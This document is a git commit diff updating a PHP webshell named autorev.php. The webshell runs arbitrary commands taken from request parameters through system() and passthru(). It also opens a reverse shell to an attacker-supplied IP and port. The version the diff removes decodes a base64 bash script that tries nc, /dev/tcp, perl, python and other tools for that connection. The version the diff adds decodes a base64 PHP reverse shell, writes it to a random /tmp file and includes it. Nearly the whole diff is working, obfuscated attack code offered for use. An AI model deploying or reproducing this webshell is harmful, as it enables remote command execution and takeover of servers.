d9dfef001c530142edf8550f1212559e40cd766c
⛩️BoyFromFuture <82044074+root-tanishq@users.noreply.github.com>
2022-03-19 18:36:11 +0530

    Update autorev.php

--- autorev.php
+++ autorev.php
@@ -3,33 +3,50 @@
 <head>
 	<meta charset="utf-8">
 	<meta name="viewport" content="width=device-width, initial-scale=1">
-	<title>BoyFromFuture</title>
+	<title>🎴 BoyFromFuture</title>
 </head>
 <body>
-	<h1>BoyFromFuture Shell</h1>
-	<p>The php webshell is created with <3 By <a href="https://twitter.com/root_tanishq">BoyFromFuture</a> This shell uses <a href="https://github.com/root-tanishq/autorev.sh">autorev.sh</a> template in background for ease of webshell<br/> The webshell also accept commands from Get Parameter ?cmd=[Command] , ?ip=[Attacker IP] ?port=[Attacker Port]</p>
+	<h1>🎴 BoyFromFuture Shell</h1>
+	<p>The php webshell is created with <3 By <a href="https://twitter.com/root_tanishq">🎴 BoyFromFuture</a> <br /><br />This shell uses <a href="https://github.com/pentestmonkey/php-reverse-shell">php-reverse-shell.php</a> template in background for ease of reverse shell<br/>
+	🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥<br />
+	 🟥 📎 The webshell also accept commands from Get Parameter ✅ ?cmd=[Command] , ✅ ?ip=[Attacker IP] ✅ ?port=[Attacker Port] 🟥<br />
+	 🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥</p>
 
 	<hr/>
 	<form method="POST">
-		Command:- [<input type="text" name="cmd" value="" style="width: 700px;">]<br /><br />
-		Reverse Shell Using autorev.sh:- IP[<input type="text" name="ip" value="">]-PORT[<input type="text" name="port" value="" style="width: 100px;">]<br /><br />[<input type="submit" name="s2" value="pwn">]<br />
+		✔️ Command:- [<input type="text" name="cmd" value="" style="width: 700px;">]<br /><br />
+		Reverse Shell Using autorev.sh:- 🖥️ IP[<input type="text" name="ip" value="">]-🖥️ PORT[<input type="text" name="port" value="" style="width: 100px;">]<br /><br />[<input type="submit" name="s2" value="pwn">]<br />
 	</form>
 	<hr/>
 	<?php 
 
-		$cmd = $_REQUEST['cmd'];
+		$bff_cmd = $_REQUEST['cmd'];
+	
 		echo "<pre>";
-		system($cmd);
+		echo "<h3>OutPut Using System ➡️</h3>";
+		system($bff_cmd);
+		echo "<p>🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥</p>";
+		echo "<h3>OutPut Using Passthru ➡️</h3>";
+		passthru($bff_cmd);
+		echo "<p>🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥</p>";
 		echo "</pre>";
+	
 
-		$ip = $_REQUEST['ip'];
-		$port = $_REQUEST['port'];
-		 $myfile = fopen("/tmp/autorev.sh", "w");
-		 $autorev = "IyEvYmluL2Jhc2gKaXA9JHsxfQpwb3J0PSR7Mn0KCmlmIFsgJCh3aGljaCBuYyA+L2Rldi9udWxsIDsgZWNobyAkPykgPT0gMCBdO3RoZW4KICAgIG5jIC1lIC9iaW4vYmFzaCAke2lwfSAke3BvcnR9OyAKICAgIG5jIC1lIC9iaW4vc2ggJHtpcH0gJHtwb3J0fTsKICAgIG5jIC1jIHNoICR7aXB9ICR7cG9ydH07CiAgICBybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfHNoIC1pIDI+JjF8bmMgJHtpcH0gJHtwb3J0fSA+L3RtcC9mOwoKZWxpZiBbICQod2hpY2ggYmFzaCA+L2Rldi9udWxsIDsgZWNobyAkPykgPT0gMCBdO3RoZW4KICAgIGVjaG8gImJhc2ggLWMgJ2V4ZWMgYmFzaCAtaSAmPi9kZXYvdGNwLyR7aXB9LyR7cG9ydH0gPCYxJyIgfCBiYXNoOwoKZWxpZiBbICQod2hpY2ggc2ggPi9kZXYvbnVsbCA7IGVjaG8gJD8pID09IDAgXTt0aGVuCiAgICBzaCAtaSA+JiAvZGV2L3RjcC8ke2lwfS8ke3BvcnR9IDA+JjE7CiAgICAwPCYxOTY7ZXhlYyAxOTY8Pi9kZXYvdGNwLyR7aXB9LyR7cG9ydH07IHNoIDwmMTk2ID4mMTk2IDI+JjE5NjsKICAgIGV4ZWMgNTw+L2Rldi90Y3AvJHtpcH0vJHtwb3J0fTtjYXQgPCY1IHwgd2hpbGUgcmVhZCBsaW5lOyBkbyAkbGluZSAyPiY1ID4mNTsgZG9uZTsKICAgIHNoIC1pIDU8PiAvZGV2L3RjcC8ke2lwfS8ke3BvcnR9IDA8JjUgMT4mNSAyPiY1OwogICAgc2ggLWkgPiYgL2Rldi91ZHAvJHtpcH0vJHtwb3J0fSAwPiYxOwoKZWxpZiBbICQod2hpY2ggcGVybCA+L2Rldi9udWxsIDsgZWNobyAkPykgPT0gMCBdO3RoZW4KICAgIHBlcmwgLU1JTyAtZSAnJHA9Zm9yaztleGl0LGlmKCRwKTskYz1uZXcgSU86OlNvY2tldDo6SU5FVChQZWVyQWRkciwiJHtpcH06JHtwb3J0fSIpO1NURElOLT5mZG9wZW4oJGMscik7JH4tPmZkb3BlbigkYyx3KTtzeXN0ZW0kXyB3aGlsZTw+Oyc7CgplbGlmIFsgJCh3aGljaCBwaHAgPi9kZXYvbnVsbCA7IGVjaG8gJD8pID09IDAgXTt0aGVuCiAgICBwaHAgLXIgJyRzb2NrPWZzb2Nrb3BlbigiJHtpcH0iLCR7cG9ydH0pO2V4ZWMoInNoIDwmMyA+JjMgMj4mMyIpOyc7CiAgICBwaHAgLXIgJyRzb2NrPWZzb2Nrb3BlbigiJHtpcH0iLCR7cG9ydH0pO3NoZWxsX2V4ZWMoInNoIDwmMyA+JjMgMj4mMyIpOyc7CiAgICBwaHAgLXIgJyRzb2NrPWZzb2Nrb3BlbigiJHtpcH0iLCR7cG9ydH0pO3N5c3RlbSgic2ggPCYzID4mMyAyPiYzIik7JzsKCmVsaWYgWyAkKHdoaWNoIHB5dGhvbiA+L2Rldi9udWxsIDsgZWNobyAkPykgPT0gMCBdO3RoZW4KICAgIGV4cG9ydCBSSE9TVD0iJHtpcH0iO2V4cG9ydCBSUE9SVD0ke3BvcnR9O3B5dGhvbiAtYyAnaW1wb3J0IHN5cyxzb2NrZXQsb3MscHR5O3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgob3MuZ2V0ZW52KCJSSE9TVCIpLGludChvcy5nZXRlbnYoIlJQT1JUIikpKSk7W29zLmR1cDIocy5maWxlbm8oKSxmZCkgZm9yIGZkIGluICgwLDEsMildO3B0eS5zcGF3bigic2giKSc7CiAgICBweXRob24gLWMgJ2ltcG9ydCBzb2NrZXQsc3VicHJvY2VzcyxvcztzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKTtzLmNvbm5lY3QoKCIke2lwfSIsJHtwb3J0fSkpO29zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpO29zLmR1cDIocy5maWxlbm8oKSwyKTtpbXBvcnQgcHR5OyBwdHkuc3Bhd24oInNoIiknOwoKZWxpZiBbICQod2hpY2ggcHl0aG9uMyA+L2Rldi9udWxsIDsgZWNobyAkPykgPT0gMCBdO3RoZW4KICAgIGV4cG9ydCBSSE9TVD0iJHtpcH0iO2V4cG9ydCBSUE9SVD0ke3BvcnR9O3B5dGhvbjMgLWMgJ2ltcG9ydCBzeXMsc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKG9zLmdldGVudigiUkhPU1QiKSxpbnQob3MuZ2V0ZW52KCJSUE9SVCIpKSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZmQpIGZvciBmZCBpbiAoMCwxLDIpXTtwdHkuc3Bhd24oInNoIiknOwogICAgcHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIiR7aXB9Iiwke3BvcnR9KSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO2ltcG9ydCBwdHk7IHB0eS5zcGF3bigic2giKSc7CgplbGlmIFsgJCh3aGljaCBydWJ5ID4vZGV2L251bGwgOyBlY2hvICQ/KSA9PSAwIF07dGhlbgogICAgcnVieSAtcnNvY2tldCAtZSdzcGF3bigic2giLFs6aW4sOm91dCw6ZXJyXT0+VENQU29ja2V0Lm5ldygiJHtpcH0iLCR7cG9ydH0pKSc7CgplbGlmIFsgJCh3aGljaCBzb2NhdCA+L2Rldi9udWxsIDsgZWNobyAkPykgPT0gMCBdO3RoZW4KICAgIHNvY2F0IFRDUDoke2lwfToke3BvcnR9IEVYRUM6c2gKCmVsaWYgWyAkKHdoaWNoIHRlbG5ldCA+L2Rldi9udWxsIDsgZWNobyAkPykgPT0gMCBdO3RoZW4KICAgIFRGPSQobWt0ZW1wIC11KTtta2ZpZm8gJFRGICYmIHRlbG5ldCAke2lwfSAke3BvcnR9IDA8JFRGIHwgc2ggMT4kVEY7CgplbGlmIFsgJCh3aGljaCB6c2ggPi9kZXYvbnVsbCA7IGVjaG8gJD8pID09IDAgXTt0aGVuCiAgICB6c2ggLWMgJ3ptb2Rsb2FkIHpzaC9uZXQvdGNwICYmIHp0Y3AgJHtpcH0gJHtwb3J0fSAmJiB6c2ggPiYkUkVQTFkgMj4mJFJFUExZIDA+JiRSRVBMWSc7CgplbGlmIFsgJCh3aGljaCBsdWEgPi9kZXYvbnVsbCA7IGVjaG8gJD8pID09IDAgXTt0aGVuCiAgICBsdWEgLWUgInJlcXVpcmUoJ3NvY2tldCcpO3JlcXVpcmUoJ29zJyk7dD1zb2NrZXQudGNwKCk7dDpjb25uZWN0KCcke2lwfScsJyR7cG9ydH0nKTtvcy5leGVjdXRlKCdzaCAtaSA8JjMgPiYzIDI+JjMnKTsiOwpmaQo=";
-		 fwrite($myfile, base64_decode($autorev));
-		 fclose($myfile);
-		$shell = "chmod +x /tmp/autorev.sh ; /tmp/autorev.sh $ip $port";
-		system($shell);
+		if (isset($_REQUEST['ip']) and isset($_REQUEST['port'])) {
+			function generateRandomString($length = 10) {
+			    return substr(str_shuffle(str_repeat($x='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil($length/strlen($x)) )),1,$length);
+			}
+			$shell="PD9waHAKc2V0X3RpbWVfbGltaXQgKDApOwokVkVSU0lPTiA9ICIxLjAiOwokY2h1bmtfc2l6ZSA9IDE0MDA7CiR3cml0ZV9hID0gbnVsbDsKJGVycm9yX2EgPSBudWxsOwokc2hlbGwgPSAndW5hbWUgLWE7IHc7IGlkOyAvYmluL3NoIC1pJzsKJGRhZW1vbiA9IDA7CiRkZWJ1ZyA9IDA7CmlmIChmdW5jdGlvbl9leGlzdHMoJ3BjbnRsX2ZvcmsnKSkgewoJJHBpZCA9IHBjbnRsX2ZvcmsoKTsKCWlmICgkcGlkID09IC0xKSB7CgkJcHJpbnRpdCgiRVJST1I6IENhbid0IGZvcmsiKTsKCQlleGl0KDEpOwoJfQoJaWYgKCRwaWQpIHsKCQlleGl0KDApOyAgLy8gUGFyZW50IGV4aXRzCgl9CglpZiAocG9zaXhfc2V0c2lkKCkgPT0gLTEpIHsKCQlwcmludGl0KCJFcnJvcjogQ2FuJ3Qgc2V0c2lkKCkiKTsKCQlleGl0KDEpOwoJfQoKCSRkYWVtb24gPSAxOwp9IGVsc2UgewoJcHJpbnRpdCgiV0FSTklORzogRmFpbGVkIHRvIGRhZW1vbmlzZS4gIFRoaXMgaXMgcXVpdGUgY29tbW9uIGFuZCBub3QgZmF0YWwuIik7Cn0KY2hkaXIoIi8iKTsKdW1hc2soMCk7CiRzb2NrID0gZnNvY2tvcGVuKCRpcCwgJHBvcnQsICRlcnJubywgJGVycnN0ciwgMzApOwppZiAoISRzb2NrKSB7CglwcmludGl0KCIkZXJyc3RyICgkZXJybm8pIik7CglleGl0KDEpOwp9CiRkZXNjcmlwdG9yc3BlYyA9IGFycmF5KAogICAwID0+IGFycmF5KCJwaXBlIiwgInIiKSwgIC8vIHN0ZGluIGlzIGEgcGlwZSB0aGF0IHRoZSBjaGlsZCB3aWxsIHJlYWQgZnJvbQogICAxID0+IGFycmF5KCJwaXBlIiwgInciKSwgIC8vIHN0ZG91dCBpcyBhIHBpcGUgdGhhdCB0aGUgY2hpbGQgd2lsbCB3cml0ZSB0bwogICAyID0+IGFycmF5KCJwaXBlIiwgInciKSAgIC8vIHN0ZGVyciBpcyBhIHBpcGUgdGhhdCB0aGUgY2hpbGQgd2lsbCB3cml0ZSB0bwopOwokcHJvY2VzcyA9IHByb2Nfb3Blbigkc2hlbGwsICRkZXNjcmlwdG9yc3BlYywgJHBpcGVzKTsKCmlmICghaXNfcmVzb3VyY2UoJHByb2Nlc3MpKSB7CglwcmludGl0KCJFUlJPUjogQ2FuJ3Qgc3Bhd24gc2hlbGwiKTsKCWV4aXQoMSk7Cn0Kc3RyZWFtX3NldF9ibG9ja2luZygkcGlwZXNbMF0sIDApOwpzdHJlYW1fc2V0X2Jsb2NraW5nKCRwaXBlc1sxXSwgMCk7CnN0cmVhbV9zZXRfYmxvY2tpbmcoJHBpcGVzWzJdLCAwKTsKc3RyZWFtX3NldF9ibG9ja2luZygkc29jaywgMCk7CgpwcmludGl0KCJTdWNjZXNzZnVsbHkgb3BlbmVkIHJldmVyc2Ugc2hlbGwgdG8gJGlwOiRwb3J0Iik7Cgp3aGlsZSAoMSkgewoJaWYgKGZlb2YoJHNvY2spKSB7CgkJcHJpbnRpdCgiRVJST1I6IFNoZWxsIGNvbm5lY3Rpb24gdGVybWluYXRlZCIpOwoJCWJyZWFrOwoJfQoKCWlmIChmZW9mKCRwaXBlc1sxXSkpIHsKCQlwcmludGl0KCJFUlJPUjogU2hlbGwgcHJvY2VzcyB0ZXJtaW5hdGVkIik7CgkJYnJlYWs7Cgl9CgoJJHJlYWRfYSA9IGFycmF5KCRzb2NrLCAkcGlwZXNbMV0sICRwaXBlc1syXSk7CgkkbnVtX2NoYW5nZWRfc29ja2V0cyA9IHN0cmVhbV9zZWxlY3QoJHJlYWRfYSwgJHdyaXRlX2EsICRlcnJvcl9hLCBudWxsKTsKCglpZiAoaW5fYXJyYXkoJHNvY2ssICRyZWFkX2EpKSB7CgkJaWYgKCRkZWJ1ZykgcHJpbnRpdCgiU09DSyBSRUFEIik7CgkJJGlucHV0ID0gZnJlYWQoJHNvY2ssICRjaHVua19zaXplKTsKCQlpZiAoJGRlYnVnKSBwcmludGl0KCJTT0NLOiAkaW5wdXQiKTsKCQlmd3JpdGUoJHBpcGVzWzBdLCAkaW5wdXQpOwoJfQoKCWlmIChpbl9hcnJheSgkcGlwZXNbMV0sICRyZWFkX2EpKSB7CgkJaWYgKCRkZWJ1ZykgcHJpbnRpdCgiU1RET1VUIFJFQUQiKTsKCQkkaW5wdXQgPSBmcmVhZCgkcGlwZXNbMV0sICRjaHVua19zaXplKTsKCQlpZiAoJGRlYnVnKSBwcmludGl0KCJTVERPVVQ6ICRpbnB1dCIpOwoJCWZ3cml0ZSgkc29jaywgJGlucHV0KTsKCX0KCglpZiAoaW5fYXJyYXkoJHBpcGVzWzJdLCAkcmVhZF9hKSkgewoJCWlmICgkZGVidWcpIHByaW50aXQoIlNUREVSUiBSRUFEIik7CgkJJGlucHV0ID0gZnJlYWQoJHBpcGVzWzJdLCAkY2h1bmtfc2l6ZSk7CgkJaWYgKCRkZWJ1ZykgcHJpbnRpdCgiU1RERVJSOiAkaW5wdXQiKTsKCQlmd3JpdGUoJHNvY2ssICRpbnB1dCk7Cgl9Cn0KCmZjbG9zZSgkc29jayk7CmZjbG9zZSgkcGlwZXNbMF0pOwpmY2xvc2UoJHBpcGVzWzFdKTsKZmNsb3NlKCRwaXBlc1syXSk7CnByb2NfY2xvc2UoJHByb2Nlc3MpOwoKZnVuY3Rpb24gcHJpbnRpdCAoJHN0cmluZykgewoJaWYgKCEkZGFlbW9uKSB7CgkJcHJpbnQgIiRzdHJpbmdcbiI7Cgl9Cn0KCj8+IAoK";
+			$random_bff = generateRandomString(10);
+			$file_name = '/tmp/'.$random_bff.'.bff';
+			$myfile = fopen($file_name, "w");
+			fwrite($myfile, base64_decode($shell));
+			fclose($myfile);
+			$ip = $_REQUEST['ip'];
+			$port = $_REQUEST['port'];
+			include($file_name);
+		}
+		
 	?>
 
 </body>
